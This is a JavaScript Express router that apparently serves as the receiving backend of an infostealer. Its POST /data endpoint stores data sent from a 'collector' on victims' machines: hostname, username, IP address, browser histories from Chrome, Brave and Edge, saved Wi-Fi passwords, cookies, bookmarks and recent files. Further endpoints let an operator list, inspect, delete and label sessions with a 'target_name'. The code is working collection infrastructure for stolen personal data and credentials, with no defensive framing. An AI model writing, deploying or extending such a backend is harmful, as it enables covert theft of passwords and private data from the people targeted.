const express = require('express');
const router = express.Router();
const Session = require('../models/Session');

// POST /data - Receive data from collector
router.post('/data', async (req, res) => {
  try {
    const { session_id, type, data, device_info } = req.body;

    if (!session_id) {
      return res.status(400).json({ error: 'session_id is required' });
    }

    // Find or create session
    let session = await Session.findOne({ session_id });

    if (!session) {
      // Create new session
      session = new Session({
        session_id,
        device_info: device_info || {},
        items_collected: [],
        data: {}
      });
      console.log(`\n[NEW SESSION] ${session_id}`);
      console.log(`Device: ${device_info?.hostname} (${device_info?.username})`);
      console.log(`IP: ${device_info?.ip_address}`);
    }

    // Update session with new data
    if (type && data) {
      // Map data types to schema fields
      const dataTypeMap = {
        'device_info': 'device_info',
        'chrome': 'chrome_history',
        'brave': 'brave_history',
        'edge': 'edge_history',
        'wifi': 'wifi_passwords',
        'system': 'system_info',
        'bookmarks': 'bookmarks',
        'cookies': 'cookies_info',
        'recent_files': 'recent_files'
      };

      const fieldName = dataTypeMap[type];

      // Debug logging for bookmarks
      if (type === 'bookmarks') {
        console.log(`\n[DEBUG bookmarks] Raw body substring:`, JSON.stringify(req.body).substring(0, 500));
      }

      if (fieldName === 'device_info') {
        session.device_info = { ...session.device_info, ...data };
      } else if (fieldName) {
        session.data[fieldName] = data;
        
        // Add to items_collected if not already there
        if (!session.items_collected.includes(type)) {
          session.items_collected.push(type);
        }
        
        console.log(`[DATA RECEIVED] ${type} - ${Array.isArray(data) ? data.length : 'N/A'} items`);
      }
    }

    // Check if collection is complete (7 data types)
    const expectedTypes = ['chrome', 'brave', 'edge', 'wifi', 'system', 'bookmarks', 'cookies', 'recent_files'];
    const collectedCount = session.items_collected.filter(item => expectedTypes.includes(item)).length;
    
    if (collectedCount >= 5) { // Consider complete if at least 5/8 collected
      session.status = 'complete';
    }

    await session.save();

    res.json({ 
      success: true, 
      session_id,
      items_collected: session.items_collected.length,
      status: session.status
    });

  } catch (error) {
    console.error('Error saving data:', error);
    res.status(500).json({ error: error.message });
  }
});

// GET /api/sessions - Get all sessions
router.get('/sessions', async (req, res) => {
  try {
    const sessions = await Session.find()
      .select('-data') // Exclude large data field from list
      .sort({ created_at: -1 })
      .limit(100);

    res.json({ 
      success: true,
      count: sessions.length,
      sessions 
    });
  } catch (error) {
    console.error('Error fetching sessions:', error);
    res.status(500).json({ error: error.message });
  }
});

// GET /api/sessions/:session_id - Get specific session with all data
router.get('/sessions/:session_id', async (req, res) => {
  try {
    const session = await Session.findOne({ session_id: req.params.session_id });
    
    if (!session) {
      return res.status(404).json({ error: 'Session not found' });
    }

    res.json({ 
      success: true,
      session 
    });
  } catch (error) {
    console.error('Error fetching session:', error);
    res.status(500).json({ error: error.message });
  }
});

// PATCH /api/sessions/:session_id - Update session (e.g., add target_name)
router.patch('/sessions/:session_id', async (req, res) => {
  try {
    const { target_name } = req.body;
    
    const session = await Session.findOneAndUpdate(
      { session_id: req.params.session_id },
      { target_name },
      { new: true }
    );

    if (!session) {
      return res.status(404).json({ error: 'Session not found' });
    }

    res.json({ 
      success: true,
      session 
    });
  } catch (error) {
    console.error('Error updating session:', error);
    res.status(500).json({ error: error.message });
  }
});

// DELETE /api/sessions/:session_id - Delete session
router.delete('/sessions/:session_id', async (req, res) => {
  try {
    const session = await Session.findOneAndDelete({ session_id: req.params.session_id });

    if (!session) {
      return res.status(404).json({ error: 'Session not found' });
    }

    res.json({ 
      success: true,
      message: 'Session deleted'
    });
  } catch (error) {
    console.error('Error deleting session:', error);
    res.status(500).json({ error: error.message });
  }
});

module.exports = router;
